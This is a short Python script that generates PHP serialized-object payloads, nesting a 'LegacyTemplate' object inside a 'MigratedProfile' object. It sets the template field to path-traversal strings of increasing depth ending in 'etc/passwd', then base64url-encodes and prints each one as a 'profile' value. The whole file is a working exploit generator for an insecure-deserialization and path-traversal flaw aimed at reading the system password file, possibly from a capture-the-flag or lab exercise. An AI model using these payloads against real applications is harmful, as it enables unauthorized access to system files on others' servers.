import base64

for depth in range(1, 11):
    template = "../" * depth + "etc/passwd"

    serialized = (
        'O:15:"MigratedProfile":1:'
        '{s:11:"displayName";'
        'O:14:"LegacyTemplate":1:'
        '{s:8:"template";s:%d:"%s";}}'
        % (len(template), template)
    )

    profile = base64.urlsafe_b64encode(
        serialized.encode()
    ).decode().rstrip("=")

    print(f"\n--- depth {depth} ---")
    print(f"template: {template}")
    print(f"profile:  {profile}")
